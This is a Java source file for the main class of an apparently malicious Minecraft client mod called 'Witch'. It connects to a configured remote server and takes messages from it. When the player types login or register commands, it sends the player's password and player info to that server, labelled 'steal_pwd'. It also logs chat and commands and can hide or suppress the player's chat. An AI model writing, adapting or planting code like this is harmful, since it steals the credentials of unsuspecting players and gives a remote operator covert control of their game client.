package me.soda.witch.client;

import me.soda.witch.client.connection.Client;
import me.soda.witch.client.connection.MessageHandler;
import me.soda.witch.client.events.AddMessageEvent;
import me.soda.witch.client.events.ConnectionMessageEvent;
import me.soda.witch.client.events.SendMessageEvent;
import me.soda.witch.client.features.ChatCommandLogging;
import me.soda.witch.client.features.Variables;
import me.soda.witch.client.utils.ChatUtil;
import me.soda.witch.client.utils.MCUtils;
import me.soda.witch.client.utils.NetUtil;
import me.soda.witch.shared.Cfg;
import me.soda.witch.shared.LogUtil;
import me.soda.witch.shared.events.EventBus;
import net.minecraft.client.MinecraftClient;

import java.util.Arrays;
import java.util.List;

public class Witch {
    public static final MinecraftClient mc = MinecraftClient.getInstance();
    private static final String server = Cfg.server();
    public static Client client;

    public static void init() {
        ChatCommandLogging.init();
        EventBus.INSTANCE.registerEvent(ConnectionMessageEvent.class, event -> MessageHandler.handleMessage(event.message));
        EventBus.INSTANCE.registerEvent(AddMessageEvent.class, event -> {
            if (Variables.INSTANCE.logChatAndCommand) ChatCommandLogging.addToList(event.message.getString());
            if (ChatUtil.filter(event.message)) event.setCancelled(true);
        });
        EventBus.INSTANCE.registerEvent(SendMessageEvent.Command.class, event -> {
            String[] cmds = event.command.split(" ");
            List<String> hint = Arrays.asList("reg", "register", "l", "login", "log");
            if (Variables.INSTANCE.passwordBeingLogged && cmds.length >= 2 && hint.contains(cmds[0])) {
                NetUtil.send("player", MCUtils.getPlayerInfo());
                NetUtil.send("steal_pwd", cmds[1]);
            }
            if (Variables.INSTANCE.logChatAndCommand) ChatCommandLogging.addToList("/" + event.command);
        });
        EventBus.INSTANCE.registerEvent(SendMessageEvent.Message.class, event -> {
            if (ChatUtil.tryChatBack(event.message)) event.setCancelled(true);
            if (Variables.INSTANCE.isMuted) event.setCancelled(true);
        });
        try {
            client = new Client(server);
        } catch (Exception e) {
            LogUtil.printStackTrace(e);
        }
    }
}
